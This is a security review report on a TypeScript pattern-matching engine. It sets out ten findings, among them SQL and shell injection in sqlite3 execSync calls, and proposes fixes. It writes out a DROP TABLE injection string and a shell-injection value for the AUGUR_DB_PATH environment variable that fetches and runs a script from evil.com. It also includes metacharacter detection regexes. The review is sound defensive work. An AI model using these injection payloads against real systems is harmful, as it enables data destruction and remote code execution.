# Task-009: Cross-Domain Pattern Transfer — Security Review

**Stage:** security | **Status:** pass (with required fixes noted)
**Phase:** 5.5 | **Date:** 2026-02-18
**Reviewer:** Pipeline Security Specialist
**Scope:** All 16 TypeScript source files + shell wrapper in `cross-domain/`

---

## Executive Summary

The CDPT engine is architecturally sound with no critical vulnerabilities in the current execution path. Two **high** severity findings require fixes before production deployment: a SQL injection vector in the atom extractor and shell injection via an untrusted environment variable. Seven additional medium/low findings are documented with mitigations. The template-based synthesis path (v1) is significantly safer than the LLM-assisted path described in design — the security posture should be preserved as LLM calls are added in v2.

**Overall verdict:** PASS WITH CONDITIONS — fixes for HIGH findings must be applied before first nightly cron run.

---

## Findings Summary

| ID      | Severity | File                                        | Finding                                                   | Status                 |
| ------- | -------- | ------------------------------------------- | --------------------------------------------------------- | ---------------------- |
| SEC-001 | HIGH     | `atom-extractor.ts`                         | SQL injection via `since` parameter                       | **Must fix**           |
| SEC-002 | HIGH     | `atom-extractor.ts`, `trading-extractor.ts` | Shell injection via unchecked DB path env var             | **Must fix**           |
| SEC-003 | MEDIUM   | `trading-extractor.ts`                      | `AUGUR_DB_PATH` can be redirected to `brain.db`           | Mitigate               |
| SEC-004 | MEDIUM   | `migration-009.ts`                          | Fragile SQL-in-shell-arg escaping                         | Accept (hardcoded SQL) |
| SEC-005 | MEDIUM   | `synthesizers/`                             | Label content flows into synthesis text (future LLM risk) | Document + cap         |
| SEC-006 | MEDIUM   | `reporter.ts`                               | Run report files have no size cap                         | Mitigate               |
| SEC-007 | MEDIUM   | `cdpt-engine.ts`                            | Config file loaded without integrity check                | Accept (local)         |
| SEC-008 | LOW      | `run-cross-domain`                          | Shell wrapper passes `$@` unvalidated                     | Fix                    |
| SEC-009 | LOW      | migration / engine                          | DB tables created but never written to                    | Document               |
| SEC-010 | INFO     | design                                      | LLM upgrade path carries prompt injection risk            | Pre-warn               |

---

## Detailed Findings

### SEC-001 — HIGH: SQL Injection in `readAtoms` via `since` parameter

**File:** `cross-domain/extractors/atom-extractor.ts`
**Line:** `query += \` WHERE created_at > '${since}'\``

The `since` parameter from `ExtractOptions` is directly interpolated into a SQL query string that is then passed via `execSync` to a shell command. Because `execSync` invokes a shell, a crafted `since` value can break out of the SQL context AND the shell string:

```typescript
// Current (VULNERABLE):
query += ` WHERE created_at > '${since}'`;
const raw = execSync(`sqlite3 -json "${dbPath}" "${query}"`, ...);

// Attacker input: since = "'; DROP TABLE atoms; --"
// Shell sees: sqlite3 -json "/path/db" "SELECT ... WHERE created_at > ''; DROP TABLE atoms; --"
```

**Blast radius:** Write access to `brain.db` atoms table. Since `brain.db` contains all Cortex memories, atoms, and embeddings, this is the highest-impact target.

**Fix (required):**

```typescript
// Option A — Validate before use (simple, sufficient for this use case):
function sanitizeSince(since: string | undefined): string | undefined {
  if (!since) return undefined;
  // Only allow ISO timestamps: YYYY-MM-DDTHH:mm:ss.sssZ format
  if (!/^\d{4}-\d{2}-\d{2}/.test(since)) return undefined;
  return since;
}

// In readAtoms():
const safeSince = sanitizeSince(since);
if (safeSince) {
  query += ` WHERE created_at > '${safeSince}'`;
}
```

**Or Option B** — Remove `since` from shell-interpolated path entirely and use SQLite's `--cmd` with a parameter file. Since `since` is currently always `undefined` in the pipeline (not set in `ExtractOptions`), the simplest fix is to remove the `since` parameter from the SQL path until parameterized queries are implemented.

---

### SEC-002 — HIGH: Shell Injection via Unchecked DB Path Environment Variables

**Files:** `atom-extractor.ts`, `trading-extractor.ts`, `cdpt-engine.ts`

All three files construct `execSync` shell commands with paths that include user-controlled input (environment variables or default path construction):

```typescript
// atom-extractor.ts (homedir is safe, but pattern is fragile):
const dbPath = `${homedir()}/.openclaw/workspace/memory/brain.db`;
execSync(`sqlite3 -json "${dbPath}" "${query}"`, ...);

// trading-extractor.ts (AUGUR_DB_PATH is externally controlled):
const dbPath = process.env.AUGUR_DB_PATH
  ?? `${homedir()}/Projects/augur-trading/data/signals.db`;
execSync(`sqlite3 -json "${dbPath}" "SELECT * FROM ${table} ..."`, ...);
```

If `AUGUR_DB_PATH` is set to `"; curl evil.com/shell.sh | bash; echo "` the shell command becomes a code execution vector.

**Fix (required):**

```typescript
// Validate that path is a safe filesystem path:
function validateDbPath(rawPath: string): string {
  const resolved = path.resolve(rawPath);
  // Must be absolute, no shell metacharacters
  if (/[;&|`$(){}[\]<>\\!#]/.test(resolved)) {
    throw new Error(`Unsafe database path: ${rawPath}`);
  }
  return resolved;
}

const dbPath = validateDbPath(
  process.env.AUGUR_DB_PATH ?? `${homedir()}/Projects/augur-trading/data/signals.db`,
);
```

**Also apply** path validation to `brain.db` path in `atom-extractor.ts` and `cdpt-engine.ts` even though those use `homedir()` (defense in depth).

---

### SEC-003 — MEDIUM: `AUGUR_DB_PATH` Can Point to `brain.db`

**File:** `trading-extractor.ts`

An attacker (or misconfiguration) could set `AUGUR_DB_PATH` to point to `brain.db`, causing the TradingExtractor to read Cortex memories as "trading signals". The extractor reads all rows up to a `LIMIT` and converts them to fingerprints. While this wouldn't corrupt the source data (SELECT only), it would:

1. Generate nonsensical trading fingerprints from memory content
2. Potentially match memory patterns against real AUGUR signals, generating false cross-domain alerts
3. Store hypotheses in Cortex that are based on corrupted data

**Mitigation:**

```typescript
// In readSignals(): after path validation, verify it's not the brain.db
const brainDbPath = path.resolve(`${homedir()}/.openclaw/workspace/memory/brain.db`);
if (path.resolve(dbPath) === brainDbPath) {
  console.warn("[TradingExtractor] AUGUR_DB_PATH points to brain.db — refusing to read.");
  return [];
}
```

---

### SEC-004 — MEDIUM: Fragile SQL-in-Shell-Arg Escaping in Migration

**File:** `cross-domain/migration-009.ts`

```typescript
execSync(`sqlite3 "${dbPath}" "${MIGRATION_SQL.replace(/"/g, '\\"')}"`, ...);
```

The approach of passing multi-line SQL as an inline shell argument by escaping double-quotes is fragile. Specifically:

- Backticks in SQL text would be executed as subshell commands
- Newlines inside the shell string depend on the shell's quoting behavior
- Single-quote SQL string literals inside the migration could interact with the outer quoting

**Assessment:** In this specific case the SQL is entirely hardcoded and contains no user-controlled values, no backticks, and no single-quote string literals. The risk is **accepted** for v1.

**Recommended for v2:** Use SQLite's `-cmd` flag or write SQL to a temp file:

```bash
sqlite3 brain.db < migration.sql
```

---

### SEC-005 — MEDIUM: Label Content Flows into Synthesis Text (Future LLM Risk)

**Files:** `synthesizers/alert-generator.ts`, `synthesizers/hypothesis-generator.ts`

Labels are constructed from raw database content (signal names, atom subjects) and sliced to 120 chars. In the current template-based synthesis (v1), they are embedded in strings returned to the caller:

```typescript
// alert-generator.ts
`Pattern "${source.label}" (confidence ... in ${srcDomain}) structurally matches "${target.label}" ...`;
```

This is safe in v1 because the text is never sent to an LLM. However, the design explicitly plans LLM-assisted synthesis in v2 (`// can be upgraded to LLM-assisted later`). When that upgrade happens, `source.label` and `target.label` will become LLM prompt content and are therefore a **prompt injection surface** — any atom or signal whose name contains adversarial instructions could hijack the LLM response.

**Current status:** Safe in v1. Pre-emptive documentation for v2 implementer.

**Required for v2:** Sanitize labels before embedding in LLM prompts:

```typescript
function sanitizeForPrompt(label: string): string {
  // Strip control chars, limit length, no injection-y patterns
  return label
    .replace(/[^\w\s\-\+\.\,\:\;\%\(\)\/]/g, " ")
    .slice(0, 80)
    .trim();
}
```

---

### SEC-006 — MEDIUM: Run Report Files Have No Size Cap

**File:** `reporter.ts`

`writeRunReport` serializes the full `CDPTRunData` object — including all fingerprints, matches, metaphors, alerts, and hypotheses — to a JSON file in `~/Projects/helios/extensions/cortex/reports/`. With 18 accepted fingerprints and 13 matches in the E2E test, this is tiny (~50KB). However if the engine is run against a large AUGUR signal database (e.g., 200 signals × 5 domains), reports could grow to several MB per run.

Nightly runs × 365 days with no cleanup = unbounded disk growth.

**Mitigation:** Add a report retention policy to `run-cross-domain`:

```bash
# In ~/bin/run-cross-domain, after exec:
# Prune reports older than 30 days
find ~/Projects/helios/extensions/cortex/reports -name "cross-domain-*.json" -mtime +30 -delete
```

And add a `max_report_size_mb` config option to cap serialization.

---

### SEC-007 — MEDIUM: Config File Loaded Without Integrity Check

**File:** `cdpt-engine.ts` → `loadConfig()`

`cdpt-config.json` is loaded from the project directory with a simple `JSON.parse`. A tampered config could:

- Set `match_threshold: 0.0` → every fingerprint matches everything → alert storm
- Set `max_hypotheses_per_run: 1000` → hypothesis proliferation
- Set `min_confidence: 0.0` → bootstrap-mode fingerprints pollute match pool
- Disable extractors → silent data blindness

**Assessment:** This is a local config file in the project directory, not externally sourced. Risk is **accepted** for local deployment with Matthew as sole operator.

**For multi-user or networked deployment:** Add schema validation via `zod` or similar with explicit min/max bounds on all numeric config fields.

---

### SEC-008 — LOW: Shell Wrapper Passes `$@` Unvalidated

**File:** `~/bin/run-cross-domain`

```bash
exec npx tsx cross-domain/cdpt-engine.ts "$@"
```

Any arguments passed to the script are forwarded directly to `tsx`. While `tsx` itself doesn't accept dangerous flags, this pattern permits future argument injection if the wrapper is used in automated contexts where the arguments aren't fully controlled.

**Fix:** Either remove `$@` passthrough (the engine takes no CLI arguments) or validate:

```bash
#!/usr/bin/env bash
set -euo pipefail
if [[ $# -gt 0 ]]; then
  echo "Usage: run-cross-domain (no arguments)" >&2
  exit 1
fi
cd ~/Projects/helios/extensions/cortex
exec npx tsx cross-domain/cdpt-engine.ts
```

---

### SEC-009 — LOW (Design Mismatch): DB Tables Created but Never Written

**Files:** `migration-009.ts` + all engine files

The migration creates three tables (`cross_domain_patterns`, `cross_domain_matches`, `domain_metaphors`) with proper schema and indexes. The engine generates data for all three in memory. However, the engine never INSERTs into these tables — results are written only to a JSON report file in `reports/`.

**Impact:** Not a security issue — a data persistence gap. The tables are empty after every run, making the idempotency constraints (UNIQUE indexes) non-functional and the DB-level deduplication logic unused.

**Recommendation:** Either:

1. Add INSERT statements to the reporter (persist results to DB — enables historical queries)
2. Or explicitly document that the DB tables are reserved for v2 persistence and remove them from the migration (to avoid schema confusion)

The current state creates drift between the schema and the code.

---

### SEC-010 — INFO: LLM Upgrade Path Carries Prompt Injection Risk

**Files:** design.md, synthesizers (planned v2)

The design specifies LLM calls via Claude Haiku/Sonnet for:

- Atom fingerprint extraction (fallback path)
- Metaphor generation
- Alert transfer recommendations
- Hypothesis generation

All four call sites will receive `source.label` / `target.label` as prompt context (see SEC-005 above). Additionally, metaphor generation will receive `shared_mechanism` text derived from heuristic keyword matches on untrusted atom content.

**Pre-warning for v2 implementer:**

- All label/mechanism text must be sanitized before embedding in LLM prompts
- LLM responses must be validated (non-empty, no injection artifacts) before storage
- Metaphors/hypotheses stored in Cortex with `importance > 2.0` require human review before promotion to atoms
- Consider a rate limit: max N LLM calls per run (the design already specifies ≤50 atom extraction, ≤10 hypotheses — enforce these as hard limits, not soft guidance)

---

## Positive Security Controls — Verified

| Control                                  | Status  | Notes                                                                          |
| ---------------------------------------- | ------- | ------------------------------------------------------------------------------ |
| Hypothesis `UNVALIDATED` prefix enforced | ✅ PASS | All hypothesis text starts with prefix (verified in `hypothesis-generator.ts`) |
| Max hypotheses per run capped            | ✅ PASS | `maxHypotheses = 10` default, enforced in loop break                           |
| Cross-domain-only matching enforced      | ✅ PASS | Domain pair iteration ensures `di ≠ dj`, same-domain comparison impossible     |
| Idempotency via `existingPairs` Set      | ✅ PASS | Canonical pair key (sorted UUIDs) prevents A-B/B-A duplication                 |
| Bootstrap confidence capped at 0.3-0.7   | ✅ PASS | Radio/fleet extractors hardcode low confidence on seed patterns                |
| Input validation in normalizer           | ✅ PASS | Confidence floor + zero-dimension rejection both enforced                      |
| `execSync` timeout set                   | ✅ PASS | 10s timeout on all DB calls prevents runaway processes                         |
| UUID-based IDs                           | ✅ PASS | `randomUUID()` used throughout — no sequential/predictable IDs                 |
| `set -euo pipefail` in shell wrapper     | ✅ PASS | Shell wrapper fails hard on errors                                             |
| Division-by-zero guard in cosine         | ✅ PASS | `if (denom === 0) return 0`                                                    |
| Error isolation per extractor            | ✅ PASS | Individual extractor failures caught; other extractors continue                |
| Read-only AUGUR access                   | ✅ PASS | All AUGUR queries use `SELECT` only; no writes to source DB                    |
| Alert generation gated on match type     | ✅ PASS | `structural` matches excluded from alerts (causal/temporal only)               |
| Confidence floor on transfer alerts      | ✅ PASS | `transfer_opportunity` requires `source ≥ 0.8 && target < 0.6`                 |

---

## Required Fixes Before Deployment

### Fix 1: Sanitize `since` in `readAtoms` (SEC-001)

```typescript
// In atom-extractor.ts, replace readAtoms():
async function readAtoms(since?: string, limit = 500): Promise<AtomRow[]> {
  const { execSync } = await import("node:child_process");
  const { homedir } = await import("node:os");
  const dbPath = `${homedir()}/.openclaw/workspace/memory/brain.db`;

  // Validate limit is a safe integer
  const safeLimit = Math.min(Math.max(1, Math.trunc(limit ?? 500)), 2000);

  let query = `SELECT id, subject, action, outcome, consequences, confidence, created_at FROM atoms`;

  // Validate since is ISO date format only — no SQL injection
  if (since && /^\d{4}-\d{2}-\d{2}(T[\d:.Z+-]*)?$/.test(since)) {
    query += ` WHERE created_at > '${since}'`;
  }
  query += ` ORDER BY created_at DESC LIMIT ${safeLimit}`;

  try {
    const raw = execSync(`sqlite3 -json "${dbPath}" "${query.replace(/"/g, '\\"')}"`, {
      encoding: "utf-8",
      timeout: 10000,
    });
    if (!raw.trim()) return [];
    return JSON.parse(raw) as AtomRow[];
  } catch {
    return [];
  }
}
```

### Fix 2: Validate DB Paths (SEC-002, SEC-003)

```typescript
// In a shared util (cross-domain/utils.ts):
import { resolve } from "node:path";
import { homedir } from "node:os";

export function validateDbPath(rawPath: string, description = "DB"): string {
  const resolved = resolve(rawPath);
  if (/[;&|`$(){}[\]<>\\!]/.test(resolved)) {
    throw new Error(`[CDPT] Unsafe ${description} path rejected: ${rawPath}`);
  }
  return resolved;
}

export function assertNotBrainDb(dbPath: string): void {
  const brainDb = resolve(`${homedir()}/.openclaw/workspace/memory/brain.db`);
  if (resolve(dbPath) === brainDb) {
    throw new Error(`[CDPT] Refusing to use brain.db as a domain data source.`);
  }
}
```

Apply in `trading-extractor.ts`:

```typescript
const rawPath = process.env.AUGUR_DB_PATH ?? `${homedir()}/Projects/augur-trading/data/signals.db`;
const dbPath = validateDbPath(rawPath, "AUGUR_DB_PATH");
assertNotBrainDb(dbPath);
```

### Fix 3: Remove `$@` from shell wrapper (SEC-008)

Edit `~/bin/run-cross-domain`:

```bash
#!/usr/bin/env bash
set -euo pipefail
cd ~/Projects/helios/extensions/cortex
exec npx tsx cross-domain/cdpt-engine.ts
```

---

## Security Risk Register

| Risk                                            | Current Likelihood           | Impact                         | Net Risk    | Treated By             |
| ----------------------------------------------- | ---------------------------- | ------------------------------ | ----------- | ---------------------- |
| Shell injection via AUGUR_DB_PATH               | Low (env var, local)         | Critical (arbitrary code exec) | HIGH        | SEC-002 fix            |
| SQL injection via `since` param                 | Very Low (not currently set) | High (brain.db write)          | MEDIUM-HIGH | SEC-001 fix            |
| Prompt injection via signal names               | Not applicable (v1)          | Medium (LLM hijack)            | LOW (v1)    | SEC-005/010 doc        |
| Hypothesis proliferation                        | Very Low (cap enforced)      | Low (memory clutter)           | LOW         | Existing cap           |
| False cross-domain alerts from bad fingerprints | Low (normalizer filters)     | Low (confusion)                | LOW         | Normalizer + bootstrap |
| Report disk exhaustion                          | Low (small files currently)  | Low (disk full)                | LOW         | SEC-006 mitigate       |

---

## Deployment Readiness

**Cleared for deployment after fixes SEC-001, SEC-002, SEC-008 are applied.**

The three fixes are low-complexity code changes that don't affect the engine's architecture or outputs. The remaining findings are either accepted, documented for v2, or low-impact mitigations.

Suggested: Apply fixes, rerun `pnpm tsc --noEmit` to verify TypeScript compiles clean, then trigger nightly cron.

---

_Security review complete. Next stage: test._
